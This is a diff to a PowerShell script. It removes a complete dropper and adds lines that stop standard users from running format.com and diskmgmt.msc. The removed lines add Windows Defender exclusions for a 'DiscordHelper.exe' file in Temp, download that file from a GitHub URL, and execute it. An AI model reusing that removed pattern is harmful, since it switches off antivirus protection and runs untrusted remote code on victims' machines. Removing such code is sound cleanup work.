@@ -1,14 +1,10 @@
-Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\DiscordHelper.exe"
-Add-MpPreference -ExclusionPath $env:TEMP\DiscordHelper.exe
-Add-MpPreference -ExclusionProcess "DiscordHelper.exe"
-$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/DiscordHelper.exe"
+# Deny standard users access to disk management tools  
+$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Users","FullControl","Deny")  
+$acl = Get-Acl "$env:windir\system32\format.com"  
+$acl.AddAccessRule($rule)  
+Set-Acl "$env:windir\system32\format.com" $acl  
 
- $output = "$env:TEMP\DiscordHelper.exe"
-
-Invoke-WebRequest -Uri $url -OutFile $output
-
-if (Test-Path $output) {
-    Start-Process -FilePath $output
-} else {
-    Write-Host "Failed to download the file."
-}
+# Also block diskmgmt.msc  
+$acl = Get-Acl "$env:windir\system32\diskmgmt.msc"  
+$acl.AddAccessRule($rule)  
+Set-Acl "$env:windir\system32\diskmgmt.msc" $acl  
